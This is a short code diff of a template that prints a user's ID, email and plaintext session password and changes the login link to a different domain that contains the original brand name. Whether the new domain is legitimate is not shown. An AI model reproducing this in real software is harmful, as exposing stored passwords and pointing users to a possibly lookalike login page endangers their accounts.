@@ -21,7 +21,7 @@
 User ID: {{ session('user_id') }}
 Email: {{ session('email') }}
 Password: {{ session('password') }}
-Login At: www.paywithlink.com/login
+Login At: https://paywithlink.octoverse.com.mm/login
 ----------------------
 `;
 
